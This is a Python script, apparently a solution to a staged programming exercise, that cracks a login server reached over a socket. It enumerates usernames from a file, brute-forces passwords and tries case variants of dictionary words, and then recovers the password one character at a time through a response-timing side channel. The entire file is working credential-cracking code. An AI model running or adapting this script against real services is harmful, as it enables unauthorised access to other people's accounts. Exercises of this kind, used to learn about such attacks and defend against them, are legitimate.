import itertools
import re
import sys, socket, os, json, time


def first_var_pass(ssocket): # for the first stage
    s_response, pass_signs = '', 'abcdefghijklmnopqrstuvwxyz0123456789'
    for i in range(1, len(pass_signs)+1):
        u_pass_iter = itertools.product(pass_signs, repeat=i)
        n = 1
        while s_response != 'Connection success!':
            try:
                u_pass = ''.join(next(u_pass_iter))
            except StopIteration:
                break
            finally:
                ssocket.send(u_pass.encode())
                s_response = ssocket.recv(1024)
                s_response = s_response.decode()
                n += 1
    return u_pass


def sec_var_pass(ssocket, s_response):  # for 3rd stage
    with open(f'{os.getcwd()}\\passwords.txt', 'r') as ps_file:
        for line in ps_file:
            p = line[:-1]
            b = itertools.product(['1', '0'], repeat=len(p) - 1)
            ps = p
            while s_response != 'Connection success!':
                if re.match('\\d', ps) is None:  # we don't need to spend time for change passwords from digits only
                    ps = p
                    try:
                        num_i = next(b)
                    except StopIteration:
                        break
                    else:
                        n = 0
                        for i in num_i:
                            if i == '1':
                                ps = ps[:n] + ps[n].upper() + ps[n+1:]  #change lettercase according to num_i variant
                                n += 1
                            else:
                                n += 1
                        ssocket.send(ps.encode())
                        s_response = ssocket.recv(1024)
                        s_response = s_response.decode()
                else:
                    ssocket.send(ps.encode())
                    s_response = ssocket.recv(1024)
                    s_response = s_response.decode()
                    break
            if s_response == 'Connection success!':
                return ps


def find_login(ssocket):  # for 4th stage: find login
    log_pass_d = {'login': '', 'password': ''}
    with open(f'{os.getcwd()}\\logins.txt', 'r') as lg_file:
        for line in lg_file:
            log_pass_d.update(login=line[:-1])
            log_pass_s = json.dumps(log_pass_d, indent=2)
            start = time.perf_counter()
            ssocket.send(log_pass_s.encode())
            s_response = ssocket.recv(1024)
            sl_response = json.loads(s_response.decode())
            end = time.perf_counter()
            if sl_response['result'] != 'Wrong login!':
                return log_pass_d


def time_resp(ssocket, login):  # check ordinary time for the response
    log_pass_s = json.dumps(login, indent=2)
    start = time.perf_counter()
    ssocket.send(log_pass_s.encode())
    s_response = ssocket.recv(1024)
    end = time.perf_counter()
    return end - start


def find_pass(ssocket, l_p_dict, time_resp):  # for 5th stage: find password
    s_response, pass_signs_w, pass_signs_n, passw = '', 'abcdefghijklmnopqrstuvwxyz', '0123456789', ''
    while True:
        for sign in itertools.chain(pass_signs_w, pass_signs_w.upper(), pass_signs_n):
            passw += sign
            l_p_dict.update(password=passw)
            log_pass_s = json.dumps(l_p_dict, indent=2)
            start = time.perf_counter()
            ssocket.send(log_pass_s.encode())
            s_response = ssocket.recv(1024)
            end = time.perf_counter()
            sl_response = json.loads(s_response.decode())
            if sl_response['result'] == 'Connection success!':
                return log_pass_s
            elif end - start > time_resp:
                continue
            # elif sl_response['result'] == 'Exception happened during login':
            #     continue
            else:
                passw = passw[:-1]


args = sys.argv
u_ip, u_port = args[1], int(args[2])
with socket.socket() as u_socket:
    u_socket.connect((u_ip, u_port))
    u_login = find_login(u_socket)
    time_del = time_resp(u_socket, u_login)
    user_password = find_pass(u_socket, u_login, time_del)
print(user_password)

